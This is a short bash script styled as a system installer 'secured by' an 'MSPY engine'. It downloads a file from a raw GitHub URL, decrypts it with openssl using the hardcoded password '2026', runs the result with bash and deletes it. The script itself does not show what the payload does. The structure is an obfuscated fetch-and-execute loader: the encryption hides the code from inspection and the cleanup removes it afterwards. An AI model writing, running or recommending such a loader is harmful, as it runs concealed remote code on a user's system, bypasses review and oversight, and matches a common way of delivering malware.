#!/bin/bash # Tk Master Baby Aight 🌬💙💨
clear
echo -e "\e[1;34m===========================================\e[0m"
echo -e "\e[1;36m     MASTERS M@☆ SYSTEM INSTALLER          \e[0m"
echo -e "\e[1;36m     SECURED BY [MSPY] ENGINE              \e[0m"
echo -e "\e[1;34m===========================================\e[0m"
echo ""
echo -e "\e[1;33m[+] Unpacking encrypted payload...\e[0m"

_tmp=$(mktemp)

# Tk Master Baby Aight 🌬💙💨
curl -sL "https://raw.githubusercontent.com/M-AT-STAR/SV/main/lckd_nstll" | openssl aes-256-cbc -d -a -pbkdf2 -pass pass:2026 > "$_tmp" 2>/dev/null

if grep -q "Initializing" "$_tmp"; then
    echo -e "\e[1;32m[+] Decryption successful. Booting setup...\e[0m"
    sleep 1
    bash "$_tmp"
    rm -f "$_tmp"
else
    echo -e "\e[1;91m[!] INSTALLATION ERROR: CORRUPT PAYLOAD.\e[0m"
    rm -f "$_tmp"
    exit 1
fi
